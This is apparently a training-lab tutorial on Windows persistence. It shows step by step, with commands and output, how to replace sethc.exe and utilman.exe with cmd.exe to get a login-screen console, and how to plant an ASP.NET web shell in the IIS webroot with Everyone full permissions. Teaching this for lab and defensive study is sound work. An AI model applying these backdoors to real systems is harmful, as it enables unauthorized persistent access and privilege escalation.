## **Backdooring the Login Screen / RDP**

### Sticky Keys
When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
```shell-session
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

### Utilman
Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again. 

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
```shell-session
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

## **Persisting Through Existing Services**
If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoor-able similarly. The possibilities are endless!

### Web Shells
The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. 

Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. 

Start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```shell-session
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:**
	Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL: `http://MACHINE_IP/shell.aspx`

Note:
	While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert!
